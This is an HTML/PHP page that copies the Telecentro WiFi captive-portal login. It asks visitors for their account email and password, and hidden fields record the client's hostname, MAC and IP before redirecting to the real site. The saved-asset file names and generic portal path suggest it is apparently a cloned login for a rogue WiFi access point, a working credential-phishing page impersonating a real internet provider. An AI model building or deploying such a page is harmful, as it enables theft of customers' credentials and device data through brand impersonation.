...
<head>
    ...
    <title>Telecentro WiFi</title>
    <meta name="title" content="Telecentro WiFi">
    <meta name="description" content="Conectate gratis en la calle - Accedé a la nueva red WiFi **Sólo clientes**">

    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="translucent">
    <meta name="theme-color" content="#21BAED">

    <link rel="icon" type="image/png" href="assets/favicon.ico" sizes="192x192">
    ...
    <script src="assets/vue.min.js.download"></script>
    <script src="assets/vuex.min.js.download"></script>
    <script src="assets/axios.min.js.download"></script>

    <script src="assets/gracias.js.download"></script>
    <script src="assets/error.js.download"></script>
    <script src="assets/sucursal.js.download"></script>
    <script src="assets/ingresar_mail.js.download"></script>
    <script src="assets/principal.js.download"></script>
    <style type="text/css">
        :root topadblock,
...
<body class="loaded">
    <div id="app" class="wrapper">
        <header><img src="assets/telecentro-wifi.svg" width="300" height="54" alt="TLC WiFi" class="tlcwifi-logo">
        </header>
        <div>
            <main>
                <div class="message">
                ...
                <div class="card card-form">
                    ...
                    <form novalidate="novalidate" class="user-auth"  method="POST" action="/captiveportal/index.php">
                        <div class="form-group"><input type="email" id="email" name="email"
                                placeholder="Tu e-mail de acceso" tabindex="1" autofocus="autofocus" required="required"
                                class="form-control"> <label for="email" class="form-control-label sr-only">Tu e-mail de
                                acceso</label></div>
                        <div class="form-group"><input type="password" id="password" name="password"
                                placeholder="Contraseña" tabindex="2" required="required" class="form-control"> <label
                                for="password" class="form-control-label sr-only">Contraseña</label></div>
                        <div class="form-check"><input type="checkbox" value="opt_in" id="opt-in" tabindex="3"
                                class="form-check-input"> <label for="opt-in" class="form-check-label"> Quiero recibir
                                notificaciones</label></div> <button type="submit" tabindex="4"
                            class="btn btn-primary">ingresar</button>
                        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                        <input type="hidden" name="target" value="https://telecentro.com.ar">
                    </form>
                </div>
            </main>
            <div>
                <div class="toast-notification toast-error">
                    <div class="toast-content"><strong>Hubo un error</strong>
                        <p>
                ...
                <div class="toast-notification toast-info show">
                    <div class="toast-content"><strong>¿No estás registrado en Sucursal Virtual?</strong>
                        <p>
                            Hacelo <a href="https://telecentro.com.ar/login" title="Registrate en Sucursal Virtual"
                                rel="noopener">desde aquí</a></p>
                    </div>
                </div>
            </div>
        </div>
        <footer></footer>
        <div class="blobs-bg"><span class="blob blob1"></span> <span class="blob blob2"></span> <span
                class="blob blob3"></span> <span class="blob blob4"></span> <span class="blob blob5"></span></div>
    </div>
